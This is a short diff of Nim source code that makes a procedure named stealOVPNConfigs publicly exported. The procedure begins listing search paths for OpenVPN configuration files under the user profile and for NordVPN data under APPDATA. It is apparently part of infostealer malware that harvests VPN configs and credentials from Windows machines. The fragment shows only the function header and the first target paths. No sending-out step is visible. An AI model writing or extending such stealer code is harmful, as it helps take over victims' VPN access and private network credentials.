@@ -1,6 +1,6 @@
 import os
 
-proc stealOVPNConfigs(): string =
+proc stealOVPNConfigs*(): string =
   let searchPaths = [
     getEnv("USERPROFILE") / "OpenVPN" / "config",
     getEnv("APPDATA") / "NordVPN",
